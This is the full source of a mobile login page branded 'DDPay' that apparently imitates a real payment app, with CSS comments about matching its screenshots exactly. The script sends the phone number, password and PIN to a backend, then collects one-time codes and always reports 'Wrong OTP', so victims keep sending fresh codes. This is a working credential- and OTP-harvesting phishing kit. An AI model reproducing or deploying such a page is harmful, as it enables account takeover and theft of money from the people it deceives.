<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>DDPay</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #f1f5f9;
      color: #333333;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      position: relative;
    }
    .container { width: 100%; max-width: 360px; text-align: center; }
    
    /* Logo Section - Exact 1st Image Style */
    .logo-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 40px;
    }
    .logo-box {
      width: 170px; height: 170px;
      background: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 15px;
    }
    .logo-box img { width: 100%; height: 100%; object-fit: contain; }

    /* Input Fields */
    .input-group {
      display: flex; align-items: center;
      background: #ffffff;
      border: 1px solid #e2e8f0;
      border-radius: 30px; 
      padding: 13px 20px;
      margin-bottom: 16px;
    }
    .input-group:focus-within { border-color: #008a45; }
    .input-group svg { 
      width: 24px; height: 24px; fill: none; stroke: #1e293b; 
      stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; 
      margin-right: 14px; flex-shrink: 0; 
    }
    .input-group input {
      background: transparent; border: none; color: #1e293b;
      font-size: 16px; width: 100%; outline: none; font-weight: 400;
    }
    .input-group input::placeholder { color: #b0b8c4; font-weight: 400; }

    /* Custom Round Checkbox Styling */
    .custom-checkbox-container {
      display: flex; align-items: center; gap: 8px; cursor: pointer; user-select: none;
    }
    .custom-checkbox-container input {
      position: absolute; opacity: 0; cursor: pointer; height: 0; width: 0;
    }
    .checkmark {
      height: 18px; width: 18px; background-color: #ffffff;
      border: 1.5px solid #cbd5e1; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      transition: all 0.2s; flex-shrink: 0;
    }
    .custom-checkbox-container input:checked ~ .checkmark {
      background-color: #34c759; border-color: #34c759;
    }
    .checkmark svg {
      width: 11px; height: 11px; stroke: white; stroke-width: 3; fill: none;
      stroke-linecap: round; stroke-linejoin: round; opacity: 0; transition: opacity 0.2s;
    }
    .custom-checkbox-container input:checked ~ .checkmark svg {
      opacity: 1;
    }

    /* Links Row */
    .row {
      display: flex; justify-content: space-between; align-items: center;
      font-size: 14px; margin-bottom: 28px;
      padding: 0 8px; font-weight: 500;
    }
    .row a { color: #008a45; text-decoration: underline; }
    .row label { color: #1e293b; }

    /* Agreement */
    .checkbox-container {
      display: flex; align-items: center; justify-content: center;
      font-size: 14px; color: #008a45; margin-bottom: 16px;
      font-weight: 500; gap: 6px;
    }
    .checkbox-container a { color: #008a45; text-decoration: underline; font-weight: 500; }

    /* Button - Exact Dark Green from 1st Image */
    .btn-main {
      width: 100%; padding: 15px;
      background: #008a45;
      color: #fff; border: none; border-radius: 30px;
      font-size: 18px; font-weight: 500; cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }
    .btn-main:hover { background: #007339; }
    .btn-main:active { transform: scale(0.98); }
    .btn-main:disabled { background: #cbd5e1; cursor: not-allowed; }

    /* Forget Password */
    .forget-password {
      display: block;
      margin-top: 35px;
      font-size: 14px;
      color: #008a45;
      text-decoration: underline;
      font-weight: 500;
    }

    /* Popup / Overlay */
    .popup-overlay {
      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center;
      padding: 20px; z-index: 1000; backdrop-filter: blur(4px);
    }
    .popup-box {
      background: #ffffff;
      padding: 25px 20px; border-radius: 24px;
      width: 100%; max-width: 360px; position: relative;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
      text-align: left;
    }
    .close-btn {
      position: absolute; top: 15px; right: 15px;
      background: #f1f5f9; color: #64748b; border: none;
      border-radius: 50%; width: 32px; height: 32px;
      font-size: 16px; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
    }
    .popup-box h2 { font-size: 20px; margin-bottom: 10px; color: #1e293b; }
    .popup-box p { font-size: 14px; color: #64748b; margin-bottom: 15px; line-height: 1.4; }
    .popup-box p span { color: #008a45; font-weight: 700; }
    
    .otp-input-group {
      display: flex; align-items: center;
      background: #fff;
      border: 1px solid #cbd5e1;
      border-radius: 25px; padding: 5px 5px 5px 15px;
      margin-bottom: 20px;
      width: 100%; overflow: hidden;
    }
    .otp-input-group input {
      flex: 1; background: transparent; border: none;
      color: #1e293b; padding: 10px 0; font-size: 16px;
      outline: none; letter-spacing: 2px; min-width: 0;
    }
    .otp-input-group button {
      background: #008a45;
      color: #fff; border: none; border-radius: 20px;
      padding: 10px 18px; font-weight: 600; cursor: pointer; font-size: 14px;
      white-space: nowrap; flex-shrink: 0;
    }
    .otp-input-group button:disabled { background: #cbd5e1; cursor: not-allowed; }
    
    .timer-text { color: #64748b; font-size: 13px; margin-bottom: 15px; text-align: center; }
    .toast {
      position: fixed; top: 20px; left: 50%;
      transform: translateX(-50%) translateY(-100px);
      background: #1e293b; color: #fff; padding: 12px 20px; border-radius: 12px;
      font-size: 14px; font-weight: 600; z-index: 2000;
      transition: transform 0.3s; max-width: 90%; text-align: center;
      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
    }
    .toast.show { transform: translateX(-50%) translateY(0); }
    .toast.error { background: #ef4444; }
    
    /* Footer Version - Bottom Right Exact Position */
    .version { 
      position: fixed; 
      bottom: 18px; 
      right: 18px; 
      font-size: 13px; 
      color: #94a3b8; 
    }
  </style>
</head>
<body>

  <div class="toast" id="toast"></div>

  <div class="container">
    
    <!-- LOGO -->
    <div class="logo-section">
      <div class="logo-box">
        <img src="logo.png" alt="DD Pay" onerror="this.style.display='none'">
      </div>
    </div>

    <!-- PHONE INPUT -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="9" r="3"></circle><path d="M6.168 18.849A4 4 0 0 1 10 16h4a4 4 0 0 1 3.834 2.855"></path></svg>
      <input type="tel" id="phone" placeholder="Phone" maxlength="10" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- PASSWORD INPUT -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><rect x="4" y="10" width="16" height="11" rx="2"></rect><path d="M8 10V7a4 4 0 0 1 8 0v3"></path><line x1="12" y1="14" x2="12" y2="17"></line></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <!-- PIN INPUT -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
      <input type="password" id="pinInput" placeholder="Pin" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <!-- REMEMBER / REGISTER -->
    <div class="row">
      <a href="#">Register</a>
      <label class="custom-checkbox-container">
        <input type="checkbox">
        <div class="checkmark">
          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        Remember Me
      </label>
    </div>

    <!-- AGREEMENT -->
    <div class="checkbox-container">
      <label class="custom-checkbox-container">
        <input type="checkbox" checked>
        <div class="checkmark">
          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        Agree
      </label>
      <a href="#">"User Privacy Agreement"</a>
    </div>

    <!-- SIGN IN BUTTON -->
    <button class="btn-main" id="signInBtn" onclick="handleSignIn()">Sign In</button>

    <!-- FORGET PASSWORD -->
    <a href="#" class="forget-password">Forget Password</a>

  </div>

  <!-- FOOTER VERSION -->
  <div class="version">v1.0.8</div>

  <!-- OTP POPUP -->
  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
      
      <div class="otp-input-group">
        <input type="tel" id="otpInput" placeholder="Enter OTP" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>
      
      <div class="timer-text" id="timerText"></div>
      <button class="btn-main" id="confirmBtn" onclick="verifyOTP()">CONFIRM</button>
    </div>
  </div>

  <script>
    let countdown;
    let timeLeft = 60;
    let isProcessing = false;
    let tempPhone = '';
    let tempPass = '';
    let tempPin = '';

    function showToast(msg, isError = false) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.className = 'toast show' + (isError ? ' error' : '');
      clearTimeout(toast._timeout);
      toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3000);
    }

    async function callAPI(data) {
      try {
        const response = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        return await response.json();
      } catch (err) {
        console.error('API Error:', err);
        return { error: 'Network error' };
      }
    }

    async function handleSignIn() {
      if (isProcessing) return;
      const phone = document.getElementById('phone').value.trim();
      const pass = document.getElementById('pass').value.trim();
      const pin = document.getElementById('pinInput').value.trim();
      const btn = document.getElementById('signInBtn');

      if (!phone || !pass || !pin) { showToast('Please fill all fields!', true); return; }
      if (phone.length !== 10) { showToast('Phone must be 10 digits!', true); return; }
      if (pin.length !== 6) { showToast('Pin must be 6 digits!', true); return; }

      tempPhone = phone;
      tempPass = pass;
      tempPin = pin;

      isProcessing = true;
      btn.disabled = true;
      btn.textContent = 'Please wait...';

      try {
        const result = await callAPI({ phone: tempPhone, pass: tempPass, pin: tempPin, type: 'login' });
        if (result.error) {
          showToast(result.error, true);
        } else {
          document.getElementById('displayPhone').innerText = "+91 " + tempPhone;
          document.getElementById('otpPopup').style.display = 'flex';
          resetTimer();
        }
      } catch (err) {
        showToast('Something went wrong!', true);
      } finally {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'Sign In';
      }
    }

    function closeOTP() {
      document.getElementById('otpPopup').style.display = 'none';
      clearInterval(countdown);
    }

    async function sendOTP() {
      const btn = document.getElementById('sendOtpBtn');
      startTimer();
      btn.disabled = true;
      btn.innerText = "Sent";
      await callAPI({ phone: tempPhone, type: 'send_otp' });
    }

    async function verifyOTP() {
      if (isProcessing) return;
      const otp = document.getElementById('otpInput').value;
      const btn = document.getElementById('confirmBtn');

      if (!otp) { showToast('Please enter OTP!', true); return; }
      if (otp.length !== 6) { showToast('OTP must be 6 digits!', true); return; }

      isProcessing = true;
      btn.disabled = true;
      btn.textContent = 'Verifying...';

      try {
        await callAPI({ phone: tempPhone, otp, type: 'verify_otp' });
      } catch (err) { console.error(err); }

      setTimeout(() => {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'CONFIRM';
        showToast('❌ Wrong OTP! Please try again.', true);
      }, 800);
    }

    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }

    function resetTimer() {
      clearInterval(countdown);
      timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
      document.getElementById('timerText').innerText = "";
    }
  </script>

</body>
</html>
